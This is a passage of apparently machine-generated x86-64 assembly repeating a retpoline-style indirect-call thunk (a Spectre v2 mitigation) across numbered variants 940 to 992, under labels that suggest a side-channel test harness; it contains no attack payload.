## Variant 940
.Lvictim_win0_var940:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000940
	jmp	.Lgg_retpol_after_000940
.Lgg_retpol_thunk_000940:
	callq	.Lgg_retpol_setup_000940
.Lgg_retpol_cap_000940:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000940
.Lgg_retpol_setup_000940:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000940:
	jmp	.Lvictim_win0_continue
## Variant 941
.Lvictim_win0_var941:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000941
	jmp	.Lgg_retpol_after_000941
.Lgg_retpol_thunk_000941:
	callq	.Lgg_retpol_setup_000941
.Lgg_retpol_cap_000941:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000941
.Lgg_retpol_setup_000941:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000941:
	jmp	.Lvictim_win0_continue
## Variant 942
.Lvictim_win0_var942:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000942
	jmp	.Lgg_retpol_after_000942
.Lgg_retpol_thunk_000942:
	callq	.Lgg_retpol_setup_000942
.Lgg_retpol_cap_000942:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000942
.Lgg_retpol_setup_000942:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000942:
	jmp	.Lvictim_win0_continue
## Variant 943
.Lvictim_win0_var943:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000943
	jmp	.Lgg_retpol_after_000943
.Lgg_retpol_thunk_000943:
	callq	.Lgg_retpol_setup_000943
.Lgg_retpol_cap_000943:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000943
.Lgg_retpol_setup_000943:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000943:
	jmp	.Lvictim_win0_continue
## Variant 944
.Lvictim_win0_var944:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000944
	jmp	.Lgg_retpol_after_000944
.Lgg_retpol_thunk_000944:
	callq	.Lgg_retpol_setup_000944
.Lgg_retpol_cap_000944:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000944
.Lgg_retpol_setup_000944:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000944:
	jmp	.Lvictim_win0_continue
## Variant 945
.Lvictim_win0_var945:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000945
	jmp	.Lgg_retpol_after_000945
.Lgg_retpol_thunk_000945:
	callq	.Lgg_retpol_setup_000945
.Lgg_retpol_cap_000945:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000945
.Lgg_retpol_setup_000945:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000945:
	jmp	.Lvictim_win0_continue
## Variant 946
.Lvictim_win0_var946:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000946
	jmp	.Lgg_retpol_after_000946
.Lgg_retpol_thunk_000946:
	callq	.Lgg_retpol_setup_000946
.Lgg_retpol_cap_000946:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000946
.Lgg_retpol_setup_000946:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000946:
	jmp	.Lvictim_win0_continue
## Variant 947
.Lvictim_win0_var947:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000947
	jmp	.Lgg_retpol_after_000947
.Lgg_retpol_thunk_000947:
	callq	.Lgg_retpol_setup_000947
.Lgg_retpol_cap_000947:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000947
.Lgg_retpol_setup_000947:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000947:
	jmp	.Lvictim_win0_continue
## Variant 948
.Lvictim_win0_var948:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000948
	jmp	.Lgg_retpol_after_000948
.Lgg_retpol_thunk_000948:
	callq	.Lgg_retpol_setup_000948
.Lgg_retpol_cap_000948:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000948
.Lgg_retpol_setup_000948:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000948:
	jmp	.Lvictim_win0_continue
## Variant 949
.Lvictim_win0_var949:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000949
	jmp	.Lgg_retpol_after_000949
.Lgg_retpol_thunk_000949:
	callq	.Lgg_retpol_setup_000949
.Lgg_retpol_cap_000949:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000949
.Lgg_retpol_setup_000949:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000949:
	jmp	.Lvictim_win0_continue
## Variant 950
.Lvictim_win0_var950:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000950
	jmp	.Lgg_retpol_after_000950
.Lgg_retpol_thunk_000950:
	callq	.Lgg_retpol_setup_000950
.Lgg_retpol_cap_000950:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000950
.Lgg_retpol_setup_000950:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000950:
	jmp	.Lvictim_win0_continue
## Variant 951
.Lvictim_win0_var951:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000951
	jmp	.Lgg_retpol_after_000951
.Lgg_retpol_thunk_000951:
	callq	.Lgg_retpol_setup_000951
.Lgg_retpol_cap_000951:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000951
.Lgg_retpol_setup_000951:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000951:
	jmp	.Lvictim_win0_continue
## Variant 952
.Lvictim_win0_var952:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000952
	jmp	.Lgg_retpol_after_000952
.Lgg_retpol_thunk_000952:
	callq	.Lgg_retpol_setup_000952
.Lgg_retpol_cap_000952:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000952
.Lgg_retpol_setup_000952:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000952:
	jmp	.Lvictim_win0_continue
## Variant 953
.Lvictim_win0_var953:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000953
	jmp	.Lgg_retpol_after_000953
.Lgg_retpol_thunk_000953:
	callq	.Lgg_retpol_setup_000953
.Lgg_retpol_cap_000953:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000953
.Lgg_retpol_setup_000953:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000953:
	jmp	.Lvictim_win0_continue
## Variant 954
.Lvictim_win0_var954:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000954
	jmp	.Lgg_retpol_after_000954
.Lgg_retpol_thunk_000954:
	callq	.Lgg_retpol_setup_000954
.Lgg_retpol_cap_000954:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000954
.Lgg_retpol_setup_000954:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000954:
	jmp	.Lvictim_win0_continue
## Variant 955
.Lvictim_win0_var955:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000955
	jmp	.Lgg_retpol_after_000955
.Lgg_retpol_thunk_000955:
	callq	.Lgg_retpol_setup_000955
.Lgg_retpol_cap_000955:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000955
.Lgg_retpol_setup_000955:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000955:
	jmp	.Lvictim_win0_continue
## Variant 956
.Lvictim_win0_var956:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000956
	jmp	.Lgg_retpol_after_000956
.Lgg_retpol_thunk_000956:
	callq	.Lgg_retpol_setup_000956
.Lgg_retpol_cap_000956:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000956
.Lgg_retpol_setup_000956:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000956:
	jmp	.Lvictim_win0_continue
## Variant 957
.Lvictim_win0_var957:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000957
	jmp	.Lgg_retpol_after_000957
.Lgg_retpol_thunk_000957:
	callq	.Lgg_retpol_setup_000957
.Lgg_retpol_cap_000957:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000957
.Lgg_retpol_setup_000957:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000957:
	jmp	.Lvictim_win0_continue
## Variant 958
.Lvictim_win0_var958:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000958
	jmp	.Lgg_retpol_after_000958
.Lgg_retpol_thunk_000958:
	callq	.Lgg_retpol_setup_000958
.Lgg_retpol_cap_000958:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000958
.Lgg_retpol_setup_000958:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000958:
	jmp	.Lvictim_win0_continue
## Variant 959
.Lvictim_win0_var959:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000959
	jmp	.Lgg_retpol_after_000959
.Lgg_retpol_thunk_000959:
	callq	.Lgg_retpol_setup_000959
.Lgg_retpol_cap_000959:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000959
.Lgg_retpol_setup_000959:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000959:
	jmp	.Lvictim_win0_continue
## Variant 960
.Lvictim_win0_var960:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000960
	jmp	.Lgg_retpol_after_000960
.Lgg_retpol_thunk_000960:
	callq	.Lgg_retpol_setup_000960
.Lgg_retpol_cap_000960:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000960
.Lgg_retpol_setup_000960:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000960:
	jmp	.Lvictim_win0_continue
## Variant 961
.Lvictim_win0_var961:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000961
	jmp	.Lgg_retpol_after_000961
.Lgg_retpol_thunk_000961:
	callq	.Lgg_retpol_setup_000961
.Lgg_retpol_cap_000961:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000961
.Lgg_retpol_setup_000961:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000961:
	jmp	.Lvictim_win0_continue
## Variant 962
.Lvictim_win0_var962:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000962
	jmp	.Lgg_retpol_after_000962
.Lgg_retpol_thunk_000962:
	callq	.Lgg_retpol_setup_000962
.Lgg_retpol_cap_000962:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000962
.Lgg_retpol_setup_000962:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000962:
	jmp	.Lvictim_win0_continue
## Variant 963
.Lvictim_win0_var963:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000963
	jmp	.Lgg_retpol_after_000963
.Lgg_retpol_thunk_000963:
	callq	.Lgg_retpol_setup_000963
.Lgg_retpol_cap_000963:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000963
.Lgg_retpol_setup_000963:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000963:
	jmp	.Lvictim_win0_continue
## Variant 964
.Lvictim_win0_var964:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000964
	jmp	.Lgg_retpol_after_000964
.Lgg_retpol_thunk_000964:
	callq	.Lgg_retpol_setup_000964
.Lgg_retpol_cap_000964:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000964
.Lgg_retpol_setup_000964:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000964:
	jmp	.Lvictim_win0_continue
## Variant 965
.Lvictim_win0_var965:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000965
	jmp	.Lgg_retpol_after_000965
.Lgg_retpol_thunk_000965:
	callq	.Lgg_retpol_setup_000965
.Lgg_retpol_cap_000965:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000965
.Lgg_retpol_setup_000965:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000965:
	jmp	.Lvictim_win0_continue
## Variant 966
.Lvictim_win0_var966:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000966
	jmp	.Lgg_retpol_after_000966
.Lgg_retpol_thunk_000966:
	callq	.Lgg_retpol_setup_000966
.Lgg_retpol_cap_000966:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000966
.Lgg_retpol_setup_000966:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000966:
	jmp	.Lvictim_win0_continue
## Variant 967
.Lvictim_win0_var967:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000967
	jmp	.Lgg_retpol_after_000967
.Lgg_retpol_thunk_000967:
	callq	.Lgg_retpol_setup_000967
.Lgg_retpol_cap_000967:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000967
.Lgg_retpol_setup_000967:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000967:
	jmp	.Lvictim_win0_continue
## Variant 968
.Lvictim_win0_var968:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000968
	jmp	.Lgg_retpol_after_000968
.Lgg_retpol_thunk_000968:
	callq	.Lgg_retpol_setup_000968
.Lgg_retpol_cap_000968:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000968
.Lgg_retpol_setup_000968:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000968:
	jmp	.Lvictim_win0_continue
## Variant 969
.Lvictim_win0_var969:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000969
	jmp	.Lgg_retpol_after_000969
.Lgg_retpol_thunk_000969:
	callq	.Lgg_retpol_setup_000969
.Lgg_retpol_cap_000969:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000969
.Lgg_retpol_setup_000969:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000969:
	jmp	.Lvictim_win0_continue
## Variant 970
.Lvictim_win0_var970:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000970
	jmp	.Lgg_retpol_after_000970
.Lgg_retpol_thunk_000970:
	callq	.Lgg_retpol_setup_000970
.Lgg_retpol_cap_000970:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000970
.Lgg_retpol_setup_000970:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000970:
	jmp	.Lvictim_win0_continue
## Variant 971
.Lvictim_win0_var971:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000971
	jmp	.Lgg_retpol_after_000971
.Lgg_retpol_thunk_000971:
	callq	.Lgg_retpol_setup_000971
.Lgg_retpol_cap_000971:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000971
.Lgg_retpol_setup_000971:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000971:
	jmp	.Lvictim_win0_continue
## Variant 972
.Lvictim_win0_var972:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000972
	jmp	.Lgg_retpol_after_000972
.Lgg_retpol_thunk_000972:
	callq	.Lgg_retpol_setup_000972
.Lgg_retpol_cap_000972:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000972
.Lgg_retpol_setup_000972:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000972:
	jmp	.Lvictim_win0_continue
## Variant 973
.Lvictim_win0_var973:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000973
	jmp	.Lgg_retpol_after_000973
.Lgg_retpol_thunk_000973:
	callq	.Lgg_retpol_setup_000973
.Lgg_retpol_cap_000973:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000973
.Lgg_retpol_setup_000973:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000973:
	jmp	.Lvictim_win0_continue
## Variant 974
.Lvictim_win0_var974:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000974
	jmp	.Lgg_retpol_after_000974
.Lgg_retpol_thunk_000974:
	callq	.Lgg_retpol_setup_000974
.Lgg_retpol_cap_000974:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000974
.Lgg_retpol_setup_000974:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000974:
	jmp	.Lvictim_win0_continue
## Variant 975
.Lvictim_win0_var975:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000975
	jmp	.Lgg_retpol_after_000975
.Lgg_retpol_thunk_000975:
	callq	.Lgg_retpol_setup_000975
.Lgg_retpol_cap_000975:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000975
.Lgg_retpol_setup_000975:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000975:
	jmp	.Lvictim_win0_continue
## Variant 976
.Lvictim_win0_var976:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000976
	jmp	.Lgg_retpol_after_000976
.Lgg_retpol_thunk_000976:
	callq	.Lgg_retpol_setup_000976
.Lgg_retpol_cap_000976:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000976
.Lgg_retpol_setup_000976:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000976:
	jmp	.Lvictim_win0_continue
## Variant 977
.Lvictim_win0_var977:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000977
	jmp	.Lgg_retpol_after_000977
.Lgg_retpol_thunk_000977:
	callq	.Lgg_retpol_setup_000977
.Lgg_retpol_cap_000977:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000977
.Lgg_retpol_setup_000977:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000977:
	jmp	.Lvictim_win0_continue
## Variant 978
.Lvictim_win0_var978:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000978
	jmp	.Lgg_retpol_after_000978
.Lgg_retpol_thunk_000978:
	callq	.Lgg_retpol_setup_000978
.Lgg_retpol_cap_000978:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000978
.Lgg_retpol_setup_000978:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000978:
	jmp	.Lvictim_win0_continue
## Variant 979
.Lvictim_win0_var979:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000979
	jmp	.Lgg_retpol_after_000979
.Lgg_retpol_thunk_000979:
	callq	.Lgg_retpol_setup_000979
.Lgg_retpol_cap_000979:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000979
.Lgg_retpol_setup_000979:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000979:
	jmp	.Lvictim_win0_continue
## Variant 980
.Lvictim_win0_var980:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000980
	jmp	.Lgg_retpol_after_000980
.Lgg_retpol_thunk_000980:
	callq	.Lgg_retpol_setup_000980
.Lgg_retpol_cap_000980:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000980
.Lgg_retpol_setup_000980:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000980:
	jmp	.Lvictim_win0_continue
## Variant 981
.Lvictim_win0_var981:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000981
	jmp	.Lgg_retpol_after_000981
.Lgg_retpol_thunk_000981:
	callq	.Lgg_retpol_setup_000981
.Lgg_retpol_cap_000981:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000981
.Lgg_retpol_setup_000981:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000981:
	jmp	.Lvictim_win0_continue
## Variant 982
.Lvictim_win0_var982:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000982
	jmp	.Lgg_retpol_after_000982
.Lgg_retpol_thunk_000982:
	callq	.Lgg_retpol_setup_000982
.Lgg_retpol_cap_000982:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000982
.Lgg_retpol_setup_000982:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000982:
	jmp	.Lvictim_win0_continue
## Variant 983
.Lvictim_win0_var983:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000983
	jmp	.Lgg_retpol_after_000983
.Lgg_retpol_thunk_000983:
	callq	.Lgg_retpol_setup_000983
.Lgg_retpol_cap_000983:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000983
.Lgg_retpol_setup_000983:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000983:
	jmp	.Lvictim_win0_continue
## Variant 984
.Lvictim_win0_var984:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000984
	jmp	.Lgg_retpol_after_000984
.Lgg_retpol_thunk_000984:
	callq	.Lgg_retpol_setup_000984
.Lgg_retpol_cap_000984:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000984
.Lgg_retpol_setup_000984:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000984:
	jmp	.Lvictim_win0_continue
## Variant 985
.Lvictim_win0_var985:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000985
	jmp	.Lgg_retpol_after_000985
.Lgg_retpol_thunk_000985:
	callq	.Lgg_retpol_setup_000985
.Lgg_retpol_cap_000985:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000985
.Lgg_retpol_setup_000985:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000985:
	jmp	.Lvictim_win0_continue
## Variant 986
.Lvictim_win0_var986:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000986
	jmp	.Lgg_retpol_after_000986
.Lgg_retpol_thunk_000986:
	callq	.Lgg_retpol_setup_000986
.Lgg_retpol_cap_000986:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000986
.Lgg_retpol_setup_000986:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000986:
	jmp	.Lvictim_win0_continue
## Variant 987
.Lvictim_win0_var987:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000987
	jmp	.Lgg_retpol_after_000987
.Lgg_retpol_thunk_000987:
	callq	.Lgg_retpol_setup_000987
.Lgg_retpol_cap_000987:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000987
.Lgg_retpol_setup_000987:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000987:
	jmp	.Lvictim_win0_continue
## Variant 988
.Lvictim_win0_var988:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000988
	jmp	.Lgg_retpol_after_000988
.Lgg_retpol_thunk_000988:
	callq	.Lgg_retpol_setup_000988
.Lgg_retpol_cap_000988:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000988
.Lgg_retpol_setup_000988:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000988:
	jmp	.Lvictim_win0_continue
## Variant 989
.Lvictim_win0_var989:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000989
	jmp	.Lgg_retpol_after_000989
.Lgg_retpol_thunk_000989:
	callq	.Lgg_retpol_setup_000989
.Lgg_retpol_cap_000989:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000989
.Lgg_retpol_setup_000989:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000989:
	jmp	.Lvictim_win0_continue
## Variant 990
.Lvictim_win0_var990:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000990
	jmp	.Lgg_retpol_after_000990
.Lgg_retpol_thunk_000990:
	callq	.Lgg_retpol_setup_000990
.Lgg_retpol_cap_000990:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000990
.Lgg_retpol_setup_000990:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000990:
	jmp	.Lvictim_win0_continue
## Variant 991
.Lvictim_win0_var991:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000991
	jmp	.Lgg_retpol_after_000991
.Lgg_retpol_thunk_000991:
	callq	.Lgg_retpol_setup_000991
.Lgg_retpol_cap_000991:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000991
.Lgg_retpol_setup_000991:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000991:
	jmp	.Lvictim_win0_continue
## Variant 992
.Lvictim_win0_var992:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
